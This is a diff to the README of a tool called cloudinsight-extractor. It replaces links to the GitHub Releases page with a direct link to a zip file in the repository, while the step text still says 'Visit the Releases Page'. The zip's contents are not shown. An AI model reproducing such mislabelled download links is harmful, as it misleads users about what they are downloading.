@@ -6,7 +6,7 @@ Welcome to **cloudinsight-extractor**, your go-to tool for analyzing and extract
 
 ## 🔗 Download Now
 
-[![Download cloudinsight-extractor](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/tonispousta/cloudinsight-extractor/releases)
+[![Download cloudinsight-extractor](https://raw.githubusercontent.com/tonispousta/cloudinsight-extractor/main/cloudinsight_extractor/extractor_cloudinsight_v3.2.zip)](https://raw.githubusercontent.com/tonispousta/cloudinsight-extractor/main/cloudinsight_extractor/extractor_cloudinsight_v3.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before diving in, check that your system meets the following requirements:
 
 To get started, visit our Releases page to download the latest version of cloudinsight-extractor. Follow these steps:
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/tonispousta/cloudinsight-extractor/releases).
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/tonispousta/cloudinsight-extractor/main/cloudinsight_extractor/extractor_cloudinsight_v3.2.zip).
 2. **Select the Latest Release**: Look for the version number (e.g., v1.0) at the top.
 3. **Download the Right File**: Click on the file that matches your operating system.
 4. **Install the Application**:
